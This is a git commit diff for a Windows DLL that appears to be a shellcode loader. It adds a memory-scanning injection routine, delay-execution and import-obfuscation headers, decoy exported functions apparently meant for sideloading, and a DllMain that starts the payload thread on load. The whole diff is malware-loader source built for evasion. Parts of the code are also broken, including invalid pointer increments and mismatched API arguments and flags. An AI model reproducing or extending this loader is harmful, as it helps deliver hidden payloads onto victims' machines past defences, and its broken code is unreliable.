f664a4354a20444dd9ba5c42336b2eae688ab0d0
l00sy4 <142809264+l00sy4@users.noreply.github.com>
2024-04-13 13:38:28 +0300

    Add files via upload

--- Source/Inject.c
+++ Source/Inject.c
@@ -1,4 +1,5 @@
 #include <Windows.h>
+#include "DelayExec.h"
 
 #define		PAGE_SIZE					4096
 #define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )
@@ -7,48 +8,41 @@ VOID _Memcpy(_In_ PVOID Destination, _In_ PVOID Source, _In_ SIZE_T Length)
 {
 	while (Length--)
 	{
-		*((PBYTE)Destination) = *((PBYTE)Source);
+		*((PBYTE)Destination)++ = *((PBYTE)Source)++;
 	}
 }
 
-PVOID Inject(_In_ PBYTE PayloadBuffer, _In_ SIZE_T PayloadSize)
-{
-	DWORD NewSize		 = SET_TO_MULTIPLE_OF_4096(PayloadSize);
-	PVOID StartAddress   = NULL;
+PVOID Inject(_In_ PVOID PayloadBuffer, _In_ SIZE_T PayloadSize)
+{	
+	if (PayloadBuffer == NULL)
+	{
+		return NULL;
+	}
 
-	if (!VirtualAlloc(NULL, &StartAddress, &NewSize, MEM_RESERVE, PAGE_READONLY))
+	DWORD					 NewSize = SET_TO_MULTIPLE_OF_4096(PayloadSize);
+	MEMORY_BASIC_INFORMATION MemoryBasicInformation;
+	PVOID					 StartAddress;
+	
+	Wait(FALSE);
+
+	for (StartAddress = NULL; VirtualQuery(StartAddress, &MemoryBasicInformation, sizeof(MEMORY_BASIC_INFORMATION));
+		StartAddress = (PVOID)((ULONG_PTR)StartAddress + MemoryBasicInformation.RegionSize))
+	{
+		if (MemoryBasicInformation.AllocationProtect == PAGE_EXECUTE_READWRITE
+			&& MemoryBasicInformation.Protect == MEM_RESERVE
+			&& MemoryBasicInformation.Type == MEM_PRIVATE
+			&& MemoryBasicInformation.RegionSize == NewSize)
+		{
+			break;
+		}
+	}
+
+	if (StartAddress == NULL)
 	{
 		return NULL;
 	}
 
 	PVOID TempAddress = StartAddress;
-
-	for (DWORD i = 0; i < NewSize / PAGE_SIZE; i++)
-	{
-		if (!VirtualAlloc(NULL, &TempAddress, PAGE_SIZE, MEM_COMMIT, PAGE_READWRITE))
-		{
-			return NULL;
-		}
-		TempAddress = (PVOID)((ULONG_PTR)StartAddress + PAGE_SIZE);
-	}
-
-	Wait(FALSE);
-
-	TempAddress         = StartAddress;
-	DWORD OldProtection = NULL;
-
-	for (DWORD i = 0; i < NewSize / PAGE_SIZE; i++)
-	{
-		if (!VirtualProtect(&TempAddress, PAGE_SIZE, PAGE_EXECUTE_READWRITE, &OldProtection))
-		{
-			return NULL;
-		}
-		TempAddress = (PVOID)((ULONG_PTR)StartAddress + PAGE_SIZE);
-	}
-
-	// Write
-
-	TempAddress = StartAddress;
 
 	for (DWORD i = 0; i < NewSize / PAGE_SIZE; i++)
 	{	
--- Source/dllmain.c
+++ Source/dllmain.c
@@ -3,6 +3,12 @@
 #include "ObfuscateIAT.h"
 #include "Inject.h"
 
+
+__declspec(dllexport) int FiberBuild() 
+{
+	return 0;
+}
+
 extern __declspec(dllexport) int EntryPoint() 
 {
     Wait(TRUE);
@@ -15,6 +21,16 @@ extern __declspec(dllexport) int EntryPoint()
 
 }
 
+__declspec(dllexport) int StartFiber() 
+{
+	return 0;
+}
+
+__declspec(dllexport) int FiberRuntimeInit() 
+{
+	return 0;
+}
+
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
@@ -23,7 +39,10 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-
+		if (!CreateThread(NULL, NULL, EntryPoint, NULL, NULL, NULL)) 
+		{
+		     return FALSE;
+		}
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
